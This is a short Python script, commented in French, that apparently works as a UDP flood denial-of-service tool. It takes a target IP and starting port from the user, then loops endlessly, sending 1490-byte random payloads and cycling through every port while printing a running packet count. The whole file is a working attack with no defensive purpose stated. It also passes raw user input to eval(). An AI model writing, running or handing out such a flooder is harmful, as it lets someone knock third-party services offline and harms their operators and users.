#Modules a importer

import sys
import os
import socket
import scapy.all as scapy
import random


#Utilisation du socket et envoie de bits randoms
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

#Type your ip and port number (find IP address using nslookup or any online website) 
ip = input("IP Cible: ")
port = eval(input("Port: "))

#Tu ne le sais pas, mais tu es déjà mort (Ken le survivant)
print("omae wa mou shindeiru" )
envoi = 0
while True:
    sock.sendto(bytes, (ip, port))
    envoi = envoi + 1
    port = port + 1
    print("Envoi %s paquets à %s à travers le port %s"%(envoi,ip,port))
    if port == 65535:
        port = 1
